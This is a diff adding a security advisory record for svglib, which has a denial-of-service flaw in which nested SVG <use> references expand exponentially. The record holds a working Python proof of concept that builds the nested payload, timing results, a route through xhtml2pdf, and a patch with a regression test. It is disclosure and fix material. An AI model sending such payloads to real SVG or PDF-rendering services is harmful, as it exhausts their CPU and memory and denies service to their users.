@@ -1,0 +1,90 @@
+{
+  "id": "GHSA-555j-qj3j-c8jv",
+  "modified": "2026-11-21T00:00:04.016340542Z",
+  "published": "2026-11-20T23:47:58Z",
+  "aliases": [
+    "CVE-2026-132275"
+  ],
+  "summary": "svglib: Exponential resource consumption via nested \u003cuse\u003e references in svg2rlg",
+  "details": "# Summary\n\n`svg2rlg()` expands `\u003cuse\u003e` references without any limit on the total number of expansions. Only direct cycles are rejected (`CircularRefError`). A group containing N `\u003cuse\u003e` elements that point to another such group multiplies the work by N per nesting level, so an SVG of about 1.4 KB makes svglib clone and render over 100,000 nodes, taking tens of seconds of CPU time and hundreds of MiB of memory. Each additional level adds about 245 bytes to the document and multiplies time by ~10.\n\nThis is the SVG `\u003cuse\u003e` variant of the XML \"billion laughs\" attack (the same class as librsvg CVE-2019-20446).\n\n# Details\n\n`SvgRenderer.renderUse()` in `src/svglib/svglib.py`:\n\n```python\ntry:\n    item = self.xlink_href_target(node, group=group)\nexcept CircularRefError:\n    node.parent.etree_element.remove(node.etree_element)\n    return group\n...\nif len(node.getchildren()) == 0:\n    # Append a copy of the referenced node as the \u003cuse\u003e child (if not\n    # already done)\n    node.append(copy.deepcopy(item))\nself.renderNode(list(node.iter_children())[-1], parent=group)\n```\n\nThe referenced node is deep-copied under the `\u003cuse\u003e` element and rendered. Any `\u003cuse\u003e` elements inside the copied subtree go through `renderUse()` again. `xlink_href_target()` raises `CircularRefError` only for a direct cycle, so a reference DAG with fan-out is expanded fully: `fan ** levels` renders.\n\nPayload shape (fan = 10, levels = 5):\n\n```xml\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"10\" height=\"10\"\u003e\n  \u003cdefs\u003e\n    \u003crect id=\"l0\" width=\"1\" height=\"1\"/\u003e\n    \u003cg id=\"l1\"\u003e\u003cuse xlink:href=\"#l0\"/\u003e ... 10 times ... \u003c/g\u003e\n    \u003cg id=\"l2\"\u003e\u003cuse xlink:href=\"#l1\"/\u003e ... 10 times ... \u003c/g\u003e\n    ...\n    \u003cg id=\"l5\"\u003e\u003cuse xlink:href=\"#l4\"/\u003e ... 10 times ... \u003c/g\u003e\n  \u003c/defs\u003e\n  \u003cuse xlink:href=\"#l5\"/\u003e\n\u003c/svg\u003e\n```\n\n# Impact\n\nDenial of service (CPU and memory exhaustion) for any application that renders SVG from an untrusted source with svglib: thumbnail/preview generation, SVG-to-PDF conversion, report generation. Only the SVG document needs to be attacker-controlled; no non-default option is required.\n\nThe same happens through `xhtml2pdf`, which depends on svglib to render SVG images. An HTML document containing `\u003cimg src=\"data:image/svg+xml;base64,...\"\u003e` passed to `pisa.CreatePDF()` triggers the expansion. HTML-to-PDF conversion of user-supplied content is a common use of xhtml2pdf in web applications.\n\n# Reproduction\n\nMinimal local PoC, non-destructive:\n\n```python\nimport io, time\nfrom svglib.svglib import svg2rlg\n\ndef make(levels, fan=10):\n    parts = ['\u003csvg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"10\" height=\"10\"\u003e\u003cdefs\u003e',\n             '\u003crect id=\"l0\" width=\"1\" height=\"1\"/\u003e']\n    for i in range(1, levels + 1):\n        parts.append(f'\u003cg id=\"l{i}\"\u003e' + f'\u003cuse xlink:href=\"#l{i-1}\"/\u003e' * fan + '\u003c/g\u003e')\n    parts.append(f'\u003c/defs\u003e\u003cuse xlink:href=\"#l{levels}\"/\u003e\u003c/svg\u003e')\n    return \"\".join(parts).encode()\n\nfor levels in (3, 4, 5):\n    data = make(levels)\n    t = time.time()\n    svg2rlg(io.BytesIO(data))\n    print(levels, len(data), f\"{time.time() - t:.1f}s\")\n```\n\nResult on svglib 2.3.0 (commit `5d28646`), Python 3.12, macOS:\n\n| levels | SVG size | time | peak RSS |\n|---|---|---|---|\n| 3 | 919 B | 0.3 s | 42 MiB |\n| 4 | 1164 B | 2.9 s | 83 MiB |\n| 5 | 1409 B | 34 s | 469 MiB |\n\nsvglib 1.5.1 from PyPI behaves the same (levels = 4: 2.8 s, 82 MiB).\n\nThrough xhtml2pdf 0.2.23 with the same SVG embedded as a `data:` URI `\u003cimg\u003e`:\n\n| levels | HTML size | time | peak RSS |\n|---|---|---|---|\n| 4 | 1626 B | 6.9 s | 133 MiB |\n| 5 | 1954 B | 78.7 s | 499 MiB |\n\n# Suggested fix\n\nCount `\u003cuse\u003e` expansions per document and stop expanding beyond a fixed limit:\n\n```diff\n@@ src/svglib/svglib.py\n # A sentinel to identify a situation where a node reference a fragment not yet defined.\n DELAYED = object()\n \n+# Upper bound on the number of \u003cuse\u003e elements expanded while rendering one document.\n+# Nested \u003cuse\u003e references multiply (a few hundred bytes can expand to millions of\n+# nodes), so rendering stops expanding \u003cuse\u003e elements beyond this limit.\n+MAX_USE_EXPANSIONS = 10_000\n+\n@@ class SvgRenderer:\n         self._external_svgs: dict[str, ExternalSVG] = {}\n+        self._use_expansions = 0\n         self.attrConverter.css_rules = CSSMatcher()\n@@ def renderUse(\n         if group is None:\n             group = Group()\n \n+        self._use_expansions += 1\n+        if self._use_expansions \u003e MAX_USE_EXPANSIONS:\n+            if self._use_expansions == MAX_USE_EXPANSIONS + 1:\n+                logger.error(\n+                    \"Too many \u003cuse\u003e expansions (limit is %d), skipping the rest\",\n+                    MAX_USE_EXPANSIONS,\n+                )\n+            return group\n+\n         try:\n             item = self.xlink_href_target(node, group=group)\n```\n\nWith the fix, a 6-level payload (1654 B, one million expansions without the limit) renders in 1.1 s with 64 MiB peak RSS. The limit value is a suggestion; 10,000 `\u003cuse\u003e` elements is far above what normal documents (icon sprites, symbol libraries) need.\n\n# Regression test\n\nA regression test `TestUseNode::test_use_nested_expansion_is_bounded` in `tests/test_basic.py` renders the 5-level payload and asserts it finishes within 10 seconds.\n\n* Without fix: test fails (30.9 s).\n* With fix: test passes (1.8 s).\n\n`python -m pytest tests/test_basic.py tests/test_units.py tests/test_external_references.py tests/test_fonts.py -q` → **190 passed, 4 skipped**. No regressions.\n\nI'm happy to share the full patch (including the test), for example as a PR on a temporary private fork of this advisory.\n\n# Affected versions\n\n`\u003c= 2.3.0` (verified on 2.3.0 and 1.5.1)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "svglib",
+        "purl": "pkg:pypi/svglib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.3.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "0.9.0b0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "0.9.4",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.6.0",
+        "2.0.0",
+        "2.0.1",
+        "2.0.2",
+        "2.0b1",
+        "2.1.0",
+        "2.2.0",
+        "2.3.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.3.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-555j-qj3j-c8jv/GHSA-555j-qj3j-c8jv.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/deeplook/svglib/security/advisories/GHSA-555j-qj3j-c8jv"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-132275"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/deeplook/svglib/commit/7380d3c3836940fd75f8e203fff80077b7d5a425"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/deeplook/svglib"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/deeplook/svglib/releases/tag/v2.3.1"
+    }
+  ]
+}
